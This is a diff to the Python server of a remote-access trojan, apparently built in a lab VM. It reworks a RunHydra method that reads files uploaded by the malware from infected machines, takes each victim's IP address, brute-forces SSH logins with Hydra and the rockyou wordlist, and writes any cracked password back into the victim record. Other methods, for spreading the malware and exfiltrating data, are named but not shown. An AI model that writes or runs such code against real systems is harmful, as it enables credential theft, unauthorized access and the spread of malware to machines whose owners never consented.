@@ -80,37 +80,47 @@ class SERVER:
                     f.write(allDiscoveredIPs[i] + '\n')
 
     def RunHydra(self):
+        #check the available targets file for IP addresses and checks that against all .pc files ip addresses.
+        #if .pc file for that computer/ip address does not contain a password or a 'hydra attempt' it will run hydra
+        print("hydra")
+
+        #get list of targets
+        with open("targetPCs.txt") as targetFile:
+            discoveredIPs = []
+            for line in targetFile:
+                discoveredIPs.append(line.strip())
+        #print(discoveredIPs)
+
+        pcList = {}
         fileList = os.listdir(".") # find all files in folder
         for file in fileList:
             if file.endswith(".pc"): #if that file is a .pc file uploaded from malware
                 print ("Checking File: " + file)
-
-                with open(file) as thisFile:
-                    for line in thisFile:
-                        if 'password' in line or 'Hydra attempted:yes' in line:
-                            print('password or hydra attempt present')
-                            runHydra = False
-                        else:
-                            #checking line for either string indicating that hydra is not needed
-                            runHydra=True
-                            break
-
-                with open(file,'a') as thisFile:
-                    if runHydra == True:
-                        print('run hydra on ' + str(thisFile.name))
-                        thisFile.write('\n'+ "Hydra attempted:yes")
-                        hResult = subprocess.run(["hydra", "-l", "user1", "-P", '/media/sf_VM_Storage/rat/RAT/rockyou_short.txt', f"ssh://{targetIP}"],capture_output=True)
-                        #print(hResult.stdout)
-                        #parse hydra data and write password to file
-                        passIndex = str(hResult.stdout).find("password:") + 10 # get index of location of 'password: ' in results
-                        password = str(hResult.stdout)[passIndex:]
-                        endIndex = password.find("1 of 1") #find end of password
-                        password = password[0:endIndex-2]
-                        print("Hydra found password is : " + password)
-                        thisFile.write('\n'+ 'password: ' + password)
-
+                with open(file) as thisFile: #open the file and parse hostname and IP data into a dict if it does not contain a password or hydra attempt
+                    if 'password' in open(file).read() or 'Hydra' in open(file).read():
+                        print("password or hydra attempt in file: " + file)
                     else:
-                        print('do NOT run hydra on ' + str(thisFile.name))    
+                        for line in thisFile: # if the file does not have a hydra or password entry, add to dict
+                            if "Hostname: " in line:
+                                pcList[file.strip()] = 1
+                            if "IP Address:" in line:
+                                pcList[file.strip()] = line[11:].strip()
+        #print (pcList)
+
+        #run hydra for each PC that still needs an attempt
+        for key, value in pcList.items():
+            print(key + " " + value)
+            hResult = subprocess.run(["hydra", "-l", "user1", "-P", '/media/sf_VM_Storage/rat/RAT/rockyou_short.txt', f"ssh://{value}"],capture_output=True)
+            
+            #parse hydra data and write password to file
+            passIndex = str(hResult.stdout).find("password:") + 10 # get index of location of 'password: ' in results
+            password = str(hResult.stdout)[passIndex:]
+            endIndex = password.find("1 of 1") #find end of password
+            password = password[0:endIndex-2]
+            print("Hydra found password is : " + password)
+
+            with open(key, 'a') as thisFile:
+                thisFile.write('\n'+ 'password: ' + password)  
 
 
     def MalSpread(self):
@@ -303,7 +313,7 @@ rat = SERVER('0.0.0.0', 3312)
 if __name__ == '__main__':
     #rat.connection()
     #rat.CompromisedExfil()
-    rat.ParsePCFiles()
-    #rat.RunHydra()
+    #rat.ParsePCFiles()
+    rat.RunHydra()
     #rat.MalSpread()
     #rat.mainloop()
